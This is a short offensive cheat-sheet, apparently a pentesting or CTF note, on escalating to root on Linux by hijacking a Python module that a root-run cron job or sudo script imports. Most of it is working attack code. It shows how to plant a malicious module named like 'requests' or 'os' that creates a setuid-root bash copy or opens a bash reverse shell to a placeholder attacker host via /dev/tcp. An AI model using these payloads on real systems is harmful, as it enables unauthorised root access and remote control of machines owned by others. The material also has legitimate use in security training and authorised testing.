# Python Library Hijack

When a script runs as root (cron, sudo) and imports a module from a writable directory, plant a malicious module with the same name.

**Identify writable import paths:**
```bash
# Find the script and its imports:
cat /opt/admin/cleanup.py  # e.g. "import requests"

# Check Python's sys.path order:
python3 -c "import sys; print('\n'.join(sys.path))"

# Check if any directory in sys.path is writable:
ls -la /opt/admin/   # local dir often first in path
```

**Plant malicious module (e.g. replacing `requests`):**
```python
# /opt/admin/requests.py (or wherever writable path is):
import os
os.system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')
```

**Or get reverse shell:**
```python
import os
os.system('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"')
```

**Wait for cron/script to run** (use pspy to watch):
```bash
pspy64 | grep python
```

**Also applicable to `sudo python`** — current directory (`.`) may be in path.

**Variations:** `os.py`, `json.py`, or any other stdlib module if cwd is writable.
